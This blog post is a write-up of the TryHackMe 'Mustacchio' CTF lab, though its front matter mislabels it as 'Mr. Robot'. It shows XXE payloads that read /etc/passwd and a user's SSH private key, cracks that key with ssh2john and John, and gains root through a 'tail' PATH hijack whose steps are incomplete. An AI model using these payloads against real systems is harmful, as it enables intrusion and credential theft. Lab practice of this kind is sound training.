---
layout: post
title: Mustaccio - coming soon
date:   2025-10-10 11:05
description: TryHackMe Mr. Robot CTF Write-Up
tags: tryhackme wordpress 
comments: false
---
-TRYHACKME CTF WRITEUP-
[Link To CTF](https://tryhackme.com/room/mustacchio)
<br>
<br>
## Our nmap scan shows ports 80 and 22 are open
************PIC
<br>
## Navigating to the home webpage we don't see much
************PIC
<br>
## Let's eumerate the hidden directories
## Our scan shows:
{% highlight bash %}
/robots.txt and /custom
{% endhighlight bash %}
************PIC
<br>
{% highlight bash %}
/robots.txt shows nothing
{% endhighlight bash %}
<br>

## Enumerating /custom further, we see subdirectory /js

************PIC
<br>
## /custom/js shows users backup file

************PIC

## We will use strings to read the file
## strings shows:
************PIC

***Note: 
The cat command may not work as expected for a .bak file primarily because .bak files are often binary files, not plain text files. The cat command is designed to print the raw contents of a file to the terminal, which works well for human-readable text but produces gibberish for binary data
<br>
## We now get a password hash
## We will use an online cracker or JTR to crack the hash:
### [hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)
************PIC

************PIC

## We now get the cracked hash:  bulldog19
<br>
{% highlight bash %}
I got stuck here.
I did not see any login pages
And ssh with the password was also failing
Lets go back and see what we missed...
{% endhighlight bash %}
<br>
## AHH, so nmap -p- shows higher port open: 8765
************PIC
## Navigating here shows the admin panel login page
************PIC
<br>
## The credentials we gathered are accepted here
## Logging in we see a message board
## Putting in random text gives us an error
************PIC
<br>
## Let's send another request and capture the response in burpsuite
## Looking at the response we can see:
{% highlight bash %}
1. username: Barry
2. ssh is allowed with the correct key
3. another directory: /auth/dontforget.bak
{% endhighlight bash %}
************PIC
<br>

## Looking at this directory path,
## We can see the xml format we will need to use:
************PIC
<br>
## Let's test this with a benign script:
{% highlight bash %}
< ?xml version="1.0" encoding="UTF-8"?>

< comment>
  < name>10DNC</name>
  < author>10DNC</author>
  < com>hacked</com>
</comment> 
{% endhighlight bash %}
<br>
## It looks like this is vulnerable to a XXE injection
## Let's check out example exploits found below:
## [github.com/swisskyrepo/....Injection#classic-xxe](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe)
<br>
## Let's modify and test the basic blind XXE vulnerability:
{% highlight bash %}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
< comment>
  < name>10DNC</name>
  < author>10DNC</author>
  < com>&test;</com>
</comment>
{% endhighlight bash %}
************PIC
<br>
## This works, Lets now try and get barry's credentials:

<br>
{% highlight bash %}
< ?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
< comment>
  < name>10DNC</name>
  < author>10DNC</author>
  < com>&test;</com>
</comment>
{% endhighlight bash %}
************PIC
-----------------
## We now get the ssh id_rsa key for barry
<br>
## We can save this to text file:
{% highlight bash %}
$ nano id_rsa
{% endhighlight bash %}
## We will then lower the permissions:
{% highlight bash %}
$ chmod 600 id_rsa
{% endhighlight bash %}
## Now use ssh2john to create hash:
{% highlight bash %}
$ ssh2john id_rsa > hash
{% endhighlight bash %}
## Then use JTR to crack hash:
{% highlight bash %}
$ john -w=/usr/share/wordlists/rockyou.txt mustacchio_hash
{% endhighlight bash %}
************PIC
## Now we can login with ssh using our new credentials:
{% highlight bash %}
$ ssh -i id_rsa barry@target_IP
password: uriel james
{% endhighlight bash %}
************PIC
<br>

## We now have a shell and can get user flag !!!!
************PIC
<br>
<br>
<br>
# Priv Esc
<br>
<br>
## Looking around,
## We see another user 
## There is an accessible elf file that we can read
************PIC
<br>
## Running strings we see that its calling another file using tail
************PIC
## We dont have permission to access the file being called
<br>
## Lets hijack the "tail" command:

## Navigate to /tmp:
{% highlight bash %}
echo "/bin/bash" > tail
{% endhighlight bash %}

## run the live_log:
{% highlight bash %}
/home/joe/live_log
{% endhighlight bash %}
************PIC
<br>
## We are now root

************PIC
## Let's capture the root flag and pwn the machine !!!
